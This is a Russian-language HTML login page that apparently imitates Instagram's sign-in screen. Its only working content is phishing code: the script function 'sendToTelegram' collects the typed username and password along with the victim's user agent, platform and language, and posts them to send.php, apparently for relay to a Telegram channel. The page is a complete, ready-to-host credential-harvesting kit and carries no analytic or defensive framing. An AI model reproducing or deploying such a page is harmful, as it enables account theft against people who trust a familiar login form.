<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<title>Вход</title>
<style>
body { margin:0; font-family: Arial; background:#fafafa; }
.container { max-width:400px; margin:60px auto; padding:20px; }
.input { width:100%; padding:16px; margin-bottom:12px; border-radius:14px; border:1px solid #ddd; background:#f5f5f5; font-size:14px; }
.login-btn { width:100%; padding:16px; border-radius:25px; border:none; background:#0095f6; color:white; font-weight:bold; cursor:pointer; }
</style>
</head>
<body>

<div class="container">
    <input id="login" class="input" type="text" placeholder="Логин">
    <input id="password" class="input" type="password" placeholder="Пароль">
    <button class="login-btn" onclick="sendToTelegram()">Войти</button>
</div>

<script>
function sendToTelegram() {
    const username = document.getElementById("login").value.trim();
    const password = document.getElementById("password").value.trim();

    if(!username || !password){
        alert("Введите логин и пароль!");
        return;
    }

    const device = navigator.userAgent;
    const platform = navigator.platform;
    const language = navigator.language;

    fetch("send.php", {
        method: "POST",
        headers: {"Content-Type":"application/x-www-form-urlencoded"},
        body: `username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&device=${encodeURIComponent(device)}&platform=${encodeURIComponent(platform)}&language=${encodeURIComponent(language)}`
    })
    .then(res => res.text())
    .then(res => alert(res))
    .catch(() => alert("Ошибка ❌"));
}
</script>

</body>
</html>
